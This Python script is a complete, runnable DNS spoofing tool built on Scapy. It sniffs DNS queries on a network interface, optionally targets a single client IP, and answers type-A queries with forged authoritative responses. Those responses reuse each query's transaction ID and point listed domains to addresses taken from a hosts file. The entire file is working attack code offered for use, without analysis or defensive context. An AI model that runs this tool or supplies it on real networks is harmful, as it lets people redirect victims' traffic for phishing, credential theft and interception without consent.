import argparse
import sys
from scapy.all import sniff, send, IP, UDP, DNS, DNSQR, DNSRR, conf


def load_hosts(path):
    hosts = {}
    with open(path, "r", encoding="utf-8") as handle:
        for raw_line in handle:
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split()
            if len(parts) < 2:
                continue
            ip = parts[0]
            domain = parts[1].rstrip(".").lower() + "."
            hosts[domain] = ip
    return hosts


def should_spoof(pkt, target_ip):
    if not pkt.haslayer(IP):
        return False
    if target_ip and pkt[IP].src != target_ip:
        return False
    return True


def make_response(pkt, spoof_ip):
    qname = pkt[DNSQR].qname
    return (
        IP(dst=pkt[IP].src, src=pkt[IP].dst)
        / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
        / DNS(
            id=pkt[DNS].id,
            qr=1,
            aa=1,
            qd=pkt[DNS].qd,
            an=DNSRR(rrname=qname, ttl=60, rdata=spoof_ip),
        )
    )


def handle_packet(pkt, hosts, target_ip):
    if not pkt.haslayer(DNSQR) or not pkt.haslayer(UDP):
        return
    if pkt[DNS].qr != 0:
        return
    # Only handle DNS Type A (IPv4) queries (qtype=1)
    if pkt[DNSQR].qtype != 1:
        return
    if not should_spoof(pkt, target_ip):
        return
    qname = pkt[DNSQR].qname.decode(errors="ignore").lower()
    if not qname.endswith("."):
        qname += "."
    spoof_ip = hosts.get(qname)
    if not spoof_ip:
        return
    response = make_response(pkt, spoof_ip)
    print(f"[*] Spoofed {qname} -> {spoof_ip}")
    send(response, verbose=0)


def run_dns_spoof(iface, target_ip, hosts_file):
    hosts = load_hosts(hosts_file)
    if not hosts:
        print("No host mappings loaded.")
        return

    if iface:
        conf.iface = iface

    print(f"Listening on {conf.iface} with {len(hosts)} host entries")
    try:
        sniff(filter="udp port 53", store=0, prn=lambda p: handle_packet(p, hosts, target_ip))
    except KeyboardInterrupt:
        print("Stopping.")


def main():
    parser = argparse.ArgumentParser(description="DNS spoofing with Scapy")
    parser.add_argument("-i", "--iface", help="Interface to listen on")
    parser.add_argument("-t", "--target-ip", help="Only spoof this client IP")
    parser.add_argument("-f", "--hosts-file", default="dns-file.txt", help="Host mapping file")
    args = parser.parse_args()
    run_dns_spoof(args.iface, args.target_ip, args.hosts_file)


if __name__ == "__main__":
    sys.exit(main())
